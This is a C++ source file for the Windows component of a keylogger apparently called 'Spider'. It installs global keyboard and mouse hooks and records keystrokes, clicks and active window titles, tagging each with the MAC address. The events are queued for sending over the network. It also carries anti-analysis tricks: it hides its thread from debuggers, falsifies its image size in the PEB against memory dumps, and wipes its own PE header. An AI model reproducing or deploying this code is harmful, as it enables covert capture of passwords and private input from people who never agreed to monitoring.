#if defined _WIN32

#include <array>
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <chrono>
#include "SpiderPlugin.h"
#include "MacAddr.h"

#include <iostream> // TODO: rm

namespace spider
{
namespace client
{
namespace library
{
std::string SpiderPlugin::m_macAddr = "";

std::map<std::uint32_t, KeyboardKey>
	SpiderPlugin::m_windowsKeyboardMap = {
		{VK_BACK, KeyboardKey::KB_BACKSPACE},
		{VK_TAB, KeyboardKey::KB_TAB},
		{VK_RETURN, KeyboardKey::KB_ENTER},
		{VK_CAPITAL, KeyboardKey::KB_CAPSLOCK},
		{VK_ESCAPE, KeyboardKey::KB_ESCAPE},
		{VK_SPACE, KeyboardKey::KB_SPACE},
		{VK_PRIOR, KeyboardKey::KB_PAGEUP},
		{VK_NEXT, KeyboardKey::KB_PAGEDOWN},
		{VK_END, KeyboardKey::KB_END},
		{VK_HOME, KeyboardKey::KB_HOME},
		{VK_LEFT, KeyboardKey::KB_ARROW_LEFT},
		{VK_UP, KeyboardKey::KB_ARROW_UP},
		{VK_RIGHT, KeyboardKey::KB_ARROW_RIGHT},
		{VK_DOWN, KeyboardKey::KB_ARROW_DOWN},
		{VK_DELETE, KeyboardKey::KB_DELETE},
		{0x30, KeyboardKey::KB_0},
		{0x31, KeyboardKey::KB_1},
		{0x32, KeyboardKey::KB_2},
		{0x33, KeyboardKey::KB_3},
		{0x34, KeyboardKey::KB_4},
		{0x35, KeyboardKey::KB_5},
		{0x36, KeyboardKey::KB_6},
		{0x37, KeyboardKey::KB_7},
		{0x38, KeyboardKey::KB_8},
		{0x39, KeyboardKey::KB_9},
		{0x41, KeyboardKey::KB_A},
		{0x42, KeyboardKey::KB_B},
		{0x43, KeyboardKey::KB_C},
		{0x44, KeyboardKey::KB_D},
		{0x45, KeyboardKey::KB_E},
		{0x46, KeyboardKey::KB_F},
		{0x47, KeyboardKey::KB_G},
		{0x48, KeyboardKey::KB_H},
		{0x49, KeyboardKey::KB_I},
		{0x4A, KeyboardKey::KB_J},
		{0x4B, KeyboardKey::KB_K},
		{0x4C, KeyboardKey::KB_L},
		{0x4D, KeyboardKey::KB_M},
		{0x4E, KeyboardKey::KB_N},
		{0x4F, KeyboardKey::KB_O},
		{0x50, KeyboardKey::KB_P},
		{0x51, KeyboardKey::KB_Q},
		{0x52, KeyboardKey::KB_R},
		{0x53, KeyboardKey::KB_S},
		{0x54, KeyboardKey::KB_T},
		{0x55, KeyboardKey::KB_U},
		{0x56, KeyboardKey::KB_V},
		{0x57, KeyboardKey::KB_W},
		{0x58, KeyboardKey::KB_X},
		{0x59, KeyboardKey::KB_Y},
		{0x5A, KeyboardKey::KB_Z},
		{VK_LWIN, KeyboardKey::KB_LCMD},
		{VK_RWIN, KeyboardKey::KB_RCMD},
		{VK_NUMPAD0, KeyboardKey::KB_0},
		{VK_NUMPAD1, KeyboardKey::KB_1},
		{VK_NUMPAD2, KeyboardKey::KB_2},
		{VK_NUMPAD3, KeyboardKey::KB_3},
		{VK_NUMPAD4, KeyboardKey::KB_4},
		{VK_NUMPAD5, KeyboardKey::KB_5},
		{VK_NUMPAD6, KeyboardKey::KB_6},
		{VK_NUMPAD7, KeyboardKey::KB_7},
		{VK_NUMPAD8, KeyboardKey::KB_8},
		{VK_NUMPAD9, KeyboardKey::KB_9},
		{VK_MULTIPLY, KeyboardKey::KB_ASTERISK},
		{VK_ADD, KeyboardKey::KB_PLUS},
		{VK_SUBTRACT, KeyboardKey::KB_MINUS},
		{VK_DIVIDE, KeyboardKey::KB_SLASH},
		{VK_F1, KeyboardKey::KB_FN1},
		{VK_F2, KeyboardKey::KB_FN2},
		{VK_F3, KeyboardKey::KB_FN3},
		{VK_F4, KeyboardKey::KB_FN4},
		{VK_F5, KeyboardKey::KB_FN5},
		{VK_F6, KeyboardKey::KB_FN6},
		{VK_F7, KeyboardKey::KB_FN7},
		{VK_F8, KeyboardKey::KB_FN8},
		{VK_F9, KeyboardKey::KB_FN9},
		{VK_F10, KeyboardKey::KB_FN10},
		{VK_F11, KeyboardKey::KB_FN11},
		{VK_F12, KeyboardKey::KB_FN12},
		{VK_F13, KeyboardKey::KB_FN13},
		{VK_F14, KeyboardKey::KB_FN14},
		{VK_F15, KeyboardKey::KB_FN15},
		{VK_F16, KeyboardKey::KB_FN16},
		{VK_F17, KeyboardKey::KB_FN17},
		{VK_F18, KeyboardKey::KB_FN18},
		{VK_F19, KeyboardKey::KB_FN19},
		{VK_F20, KeyboardKey::KB_FN20},
		{VK_F21, KeyboardKey::KB_FN21},
		{VK_F22, KeyboardKey::KB_FN22},
		{VK_F23, KeyboardKey::KB_FN23},
		{VK_F24, KeyboardKey::KB_FN24},
		{VK_NUMLOCK, KeyboardKey::KB_NUMLOCK},
		{VK_SCROLL, KeyboardKey::KB_SCROLL},
		{VK_LSHIFT, KeyboardKey::KB_LSHIFT},
		{VK_RSHIFT, KeyboardKey::KB_RSHIFT},
		{VK_LCONTROL, KeyboardKey::KB_LCTRL},
		{VK_RCONTROL, KeyboardKey::KB_RCTRL},
		{VK_OEM_1, KeyboardKey::KB_SEMICOLON}, // : if shift
		{VK_OEM_PLUS, KeyboardKey::KB_PLUS},
		{VK_OEM_COMMA, KeyboardKey::KB_COMMA},	// < if shift
		{VK_OEM_MINUS, KeyboardKey::KB_MINUS},	// _ if shift
		{VK_OEM_PERIOD, KeyboardKey::KB_DOT},	 // > if shift
		{VK_OEM_2, KeyboardKey::KB_SLASH},		  // ? if shift
		{VK_OEM_3, KeyboardKey::KB_BACKQUOTE},	// ~ if shift
		{VK_OEM_4, KeyboardKey::KB_LEFTBRACKET},  // { if shift
		{VK_OEM_5, KeyboardKey::KB_BACKSLASH},	// | if shift
		{VK_OEM_6, KeyboardKey::KB_RIGHTBRACKET}, // } if shift
		{VK_OEM_7, KeyboardKey::KB_SIMPLEQUOTE}   // " if shift
};

bool SpiderPlugin::initWindows()
{
	// Hide window
	// TODO: Un-comment
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Check if already loaded
	HANDLE hMutex = CreateMutex(NULL, FALSE, "winSp1d3r");
	if (hMutex && GetLastError() != 0)
	{
		return false;
	}

#ifndef _WIN64
	// Hide current thread
	hideThreadWindows(GetCurrentThread());
#endif

	// Change image size, preventing from memory dump
	std::uint32_t NewSize = (std::rand() & 0x7777) + 0x100000;
#ifndef _WIN64
	// 32 bits
	__asm {
		mov eax, fs:[0x30] // PEB
		nop
		mov eax, [eax + 0x0c] // PEB_LDR_DATA
		nop
		nop
		mov eax, [eax + 0x0c] // InOrderModuleList
		nop
		mov ecx, NewSize
		mov dword ptr[eax + 0x20], ecx // SizeOfImage
		nop
	}
#endif

	// Remove PE header
	DWORD OldProtect = 0;

	// Get base address of module
	char *pBaseAddr = reinterpret_cast<char *>(GetModuleHandle(nullptr));
	// Change memory protection
	// Assume x86 page size
	VirtualProtect(pBaseAddr, 0x1000, PAGE_READWRITE, &OldProtect);
	// Erase the header
	std::memset(pBaseAddr, 0, 0x1000);

	// Get informations
	getInfosWindows();

	MacAddress::get(m_macAddr);
	std::cout << "MacAddress: " << m_macAddr << std::endl;

	return true;
}

bool SpiderPlugin::hideThreadWindows(void *handleThread)
{

	typedef NTSTATUS(NTAPI * pNtSetInformationThread)(HANDLE, UINT, PVOID, ULONG);
	if (!handleThread)
	{
		return false;
	}
	// Get NtSetInformationThread
	pNtSetInformationThread NtSIT = reinterpret_cast<pNtSetInformationThread>(GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread"));

	// Shouldn't fail
	if (!NtSIT)
	{
		return false;
	}
	// 0x11 -> HideFromDebugger
	NTSTATUS Status = NtSIT(handleThread, 0x11, 0, 0);
	return !!Status;
}

bool SpiderPlugin::deinitWindows()
{
	system("pause");
	return false;
}

Architecture SpiderPlugin::detectArchWindows() const
{
	// Using WinAPI types
	int is64 = 0;

	// typedef for function prototype
	typedef BOOL(WINAPI * LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = reinterpret_cast<LPFN_ISWOW64PROCESS>(GetProcAddress(
		GetModuleHandle(TEXT("kernel32")), "IsWow64Process"));

	if (fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &is64))
		{
			return Architecture::BITS_UNKNOWN;
		}
	}
	return (is64) ? Architecture::BITS_64 : Architecture::BITS_32;
}

std::uint64_t SpiderPlugin::getRAMWindows() const
{
	typedef int(WINAPI * PGMSE)(LPMEMORYSTATUSEX);
	PGMSE pGMSE = reinterpret_cast<PGMSE>(GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), TEXT("GlobalMemoryStatusEx")));
	if (pGMSE)
	{
		MEMORYSTATUSEX mi;

		std::memset(&mi, 0, sizeof(MEMORYSTATUSEX));
		mi.dwLength = sizeof(MEMORYSTATUSEX);
		if (pGMSE(&mi) == TRUE)
		{
			return mi.ullTotalPhys / (1024ull * 1024ull);
		}
		pGMSE = 0;
	}
	MEMORYSTATUS mi;

	std::memset(&mi, 0, sizeof(MEMORYSTATUS));
	mi.dwLength = sizeof(MEMORYSTATUS);
	GlobalMemoryStatus(&mi);
	return mi.dwTotalPhys / (1024ull * 1024ull);
}

void SpiderPlugin::getInfosWindows()
{
	m_infos.arch = detectArchWindows();
	m_infos.os = OperatingSystem::Windows;

	SYSTEM_INFO sysInfos;
	GetNativeSystemInfo(&sysInfos);

	// Fill processor architecture informations
	switch (sysInfos.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64:
		m_infos.pArch = ProcArchitecture::AMD64;
		break;
	case PROCESSOR_ARCHITECTURE_ARM:
		m_infos.pArch = ProcArchitecture::ARM;
		break;
	case PROCESSOR_ARCHITECTURE_IA64:
		m_infos.pArch = ProcArchitecture::IntelItanium;
		break;
	case PROCESSOR_ARCHITECTURE_INTEL:
		m_infos.pArch = ProcArchitecture::x86;
		break;
	default:
		m_infos.pArch = ProcArchitecture::Unknown;
		break;
	}
	m_infos.pageSize = sysInfos.dwPageSize;
	m_infos.nbProc = static_cast<std::uint16_t>(sysInfos.dwNumberOfProcessors);
	m_infos.ram = getRAMWindows();
}

void SpiderPlugin::translateKey(std::uint32_t virtualKey, spider::client::SystemMsg &msg)
{
	static bool shift = false;

	msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_NONE);
	msg.event.upper = 0;
	if ((virtualKey == VK_SHIFT) || (virtualKey == VK_LSHIFT) || (virtualKey == VK_RSHIFT))
	{
		shift = (msg.event.state == SystemMsgEventState::Up) ? false : true;
		return;
	}
	if (m_windowsKeyboardMap.find(virtualKey) != m_windowsKeyboardMap.end())
	{
		msg.event.key = static_cast<std::uint32_t>(m_windowsKeyboardMap[virtualKey]);
		if (shift)
		{
			switch (msg.event.key)
			{
			case static_cast<std::uint32_t>(KeyboardKey::KB_1):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_EXCLAMATION);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_2):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_ATSYMBOL);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_3):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_HASHTAG);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_4):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_DOLLAR);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_5):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_PERCENT);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_6):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_CIRCUMFLEX);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_7):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_AMPERSAND);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_8):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_ASTERISK);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_9):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_LEFTPAREN);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_0):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_EXCLAMATION);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_SEMICOLON):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_COLON);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_EQUALS):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_PLUS);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_COMMA):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_INFERIOR);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_MINUS):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_UNDERSCORE);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_DOT):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_SUPERIOR);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_SLASH):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_QUESTION);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_BACKQUOTE):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_TILDE);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_LEFTBRACKET):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_LEFTBRACE);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_BACKSLASH):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_VERTICALBAR);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_RIGHTBRACKET):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_RIGHTBRACE);
				break;
			case static_cast<std::uint32_t>(KeyboardKey::KB_SIMPLEQUOTE):
				msg.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_DOUBLEQUOTE);
				break;
			default:
				msg.event.upper = 1;
				break;
			}
		}
	}
}

LRESULT CALLBACK SpiderPlugin::keyboardHookWindows(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		spider::client::SystemMsg msg;
		bool send = false;

		msg.type = SystemMsgType::EventKeyboard;
		msg.time = std::chrono::duration_cast<std::chrono::microseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		std::copy(m_macAddr.begin(), m_macAddr.end(), msg.mac.data());
		switch (wParam)
		{
		case WM_KEYDOWN:
			msg.event.state = SystemMsgEventState::Down;
			send = true;
			break;
		case WM_SYSKEYDOWN:
			break;
		case WM_KEYUP:
			msg.event.state = SystemMsgEventState::Up;
			send = true;
			break;
		case WM_SYSKEYUP:
			break;
		default:
			break;
		}
		if (send)
		{
			BYTE KeyState[256];
			WORD wBuf;
			KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT *)lParam);
			GetKeyboardState(KeyState);
			ToAscii(hooked.vkCode, hooked.scanCode, KeyState, &wBuf, 0);
			std::cout << "Pressed: " << (char)wBuf << std::endl;
			// TODO: treat special keys

			std::array<char, MAX_PATH> currentWindow;
			GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
			std::string cur(currentWindow.data());

			extractPath(cur);
			msg.currentWindow.fill(0);
			std::copy(cur.begin(), cur.end(), msg.currentWindow.data());
			m_sendToNetwork->push(msg);
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK SpiderPlugin::mouseHookWindows(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		bool getPos = false;
		spider::client::SystemMsg msg;

		msg.type = spider::client::SystemMsgType::EventMouse;
		msg.time = std::chrono::duration_cast<std::chrono::microseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
		msg.event.upper = 0;
		std::copy(m_macAddr.begin(), m_macAddr.end(), msg.mac.data());
		switch (wParam)
		{
		case WM_LBUTTONDOWN:
			getPos = true;
			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonLeft);
			msg.event.state = SystemMsgEventState::Down;
			break;
		case WM_LBUTTONUP:
			getPos = true;
			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonLeft);
			msg.event.state = SystemMsgEventState::Up;
			break;
		case WM_RBUTTONDOWN:
			getPos = true;
			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonRight);
			msg.event.state = SystemMsgEventState::Down;
			break;
		case WM_RBUTTONUP:
			getPos = true;
			msg.event.key = static_cast<std::uint32_t>(MouseButton::ButtonRight);
			msg.event.state = SystemMsgEventState::Up;
			break;
		default:
			break;
		}
		if (getPos)
		{
			std::array<char, MAX_PATH> currentWindow;
			GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
			std::string cur(currentWindow.data());

			extractPath(cur);
			msg.currentWindow.fill(0);
			std::copy(cur.begin(), cur.end(), msg.currentWindow.data());
			msg.event.posX = reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.x;
			msg.event.posY = reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.y;

			SpiderPlugin::m_sendToNetwork->push(msg);
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool SpiderPlugin::hookKeyboardWindows()
{
	// Install global hook
	m_keyboardHookWin = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookWindows, 0, 0);
	if (!m_keyboardHookWin)
	{
		return false;
	}
	return true;
}

bool SpiderPlugin::unHookKeyboardWindows()
{
	// Un-install global hook
	if (m_keyboardHookWin)
	{
		UnhookWindowsHookEx(m_keyboardHookWin);
	}
	m_keyboardHookWin = nullptr;
	return false;
}

bool SpiderPlugin::hookMouseWindows()
{
	// Install global hook
	m_mouseHookWin = SetWindowsHookEx(WH_MOUSE_LL, mouseHookWindows, 0, 0);
	if (!m_mouseHookWin)
	{
		return false;
	}
	return true;
}

bool SpiderPlugin::unHookMouseWindows()
{
	// Un-install global hook
	if (m_keyboardHookWin)
	{
		UnhookWindowsHookEx(m_keyboardHookWin);
	}
	m_keyboardHookWin = nullptr;
	return false;
}

void SpiderPlugin::runWindows() const
{
	MSG msg;

	while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
	{
		if (msg.message == WM_QUIT)
		{
			break;
		}
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}
}
}
}
#endif